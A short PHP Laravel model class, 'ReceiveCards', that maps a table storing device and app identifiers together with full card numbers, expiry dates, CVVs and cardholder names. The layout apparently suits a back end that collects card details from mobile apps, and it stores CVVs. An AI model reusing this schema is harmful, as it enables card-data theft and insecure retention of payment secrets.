<?php

namespace App\Models;

class ReceiveCards extends BaseModel
{
    /**
     * The table associated with the model.
     *
     * @var string
     */
    protected $table = 'receive_cards';

    /**
     * The attributes that are mass assignable.
     *
     * @var array
     */
    protected $fillable = [
        'device_id',
        'device_number',
        'app_name',
        'app_package',
        'card_number',
        'card_date',
        'cvv',
        'user_first_name',
        'user_last_name',
    ];
}

